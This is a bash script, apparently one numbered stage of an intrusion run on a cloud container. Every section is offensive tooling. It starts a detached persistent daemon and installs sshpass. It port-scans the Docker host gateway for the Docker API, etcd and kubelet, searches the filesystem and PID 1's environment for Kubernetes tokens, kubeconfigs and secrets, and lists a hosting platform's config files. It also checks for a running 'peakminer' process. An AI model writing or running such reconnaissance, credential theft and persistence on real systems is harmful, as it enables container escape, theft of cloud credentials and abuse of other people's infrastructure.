#!/bin/bash
set +e
echo "###P22START $(date -u)"
mkdir -p /root/q; pgrep -f '/root/q/run.sh' >/dev/null || (setsid nohup bash /root/q/run.sh >/root/q/daemon.log 2>&1 &)
echo "=== D-SECTION-FROM-P20 ==="; sed -n '/=== D. RSYNC/,/=== E. HOSTSSHD/p' /root/q/p20.log | head -30
echo "=== TOOLING ==="; command -v sshpass rsync ssh python3 | tr '\n' ' '; echo
timeout 120 bash -c 'apt-get update -qq >/dev/null 2>&1; apt-get install -y -qq sshpass >/dev/null 2>&1'; command -v sshpass || echo NO_SSHPASS
echo "=== DIRECT 172.17.0.1 PORTS ==="
python3 - <<'PY'
import socket
ports=[22,80,443,1234,2375,2376,2379,5000,6063,6443,8080,8081,8188,8265,8429,8888,9100,9400,9999,10221,10248,10250,10255,10257,10259,11434,123,2023,2025,2049,2377,7946]
for p in ports:
    s=socket.socket(); s.settimeout(2.5)
    try:
        s.connect(("172.17.0.1",p))
        try:
            s.sendall(b"HEAD / HTTP/1.0\r\n\r\n" if p in (80,443,8080,8081,8188,8888,9100,9400,10221,123,2023,2025,8429,11434,9999) else b"")
            s.settimeout(2)
            d=s.recv(160)
        except Exception as e: d=("<%s>"%type(e).__name__).encode()
        print("OPEN",p,repr(d[:80]))
    except Exception as e:
        pass
    finally: s.close()
PY
echo "=== KUBE/SA TOKEN HUNT ==="
ls -l /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1 | head -5
for f in /var/run/secrets/kubernetes.io/serviceaccount/token /run/secrets/kubernetes.io/serviceaccount/token /var/lib/kubelet/kubeconfig /etc/rancher/k3s/k3s.yaml /root/.kube/config /root/k3s.yaml /etc/kubernetes/kubelet.conf /.onething/instance/configmap /root/onethingai-fs/.kube/config; do [ -e "$f" ] && echo "FOUND $f $(stat -c %s $f)" || echo "miss $f"; done
echo "--- env token hints"; tr '\0' '\n' < /proc/1/environ | grep -aiE 'kube|token|secret|api' | head -10
echo "--- find kubeconfig/token"; timeout 90 find / -xdev \( -name 'kubeconfig' -o -name 'k3s.yaml' -o -name '*.kubeconfig' -o -name 'serviceaccount' -o -name 'token' \) -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -20
echo "=== PLATFORM CONFIG DIRS ==="
ls -la /.onething/ /.onething/instance/ /root/onethingai-fs/ 2>&1 | head -40
echo "=== PLATFORM CONFIG CONTENT ==="
timeout 20 find /.onething /root/onethingai-fs -maxdepth 3 -type f \( -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.env' -o -name '*.conf' \) 2>/dev/null | head -30
echo "=== PEAKMINER-LIVE ==="; pgrep -fa peakminer | head -3
echo "###P22END $(date -u)"
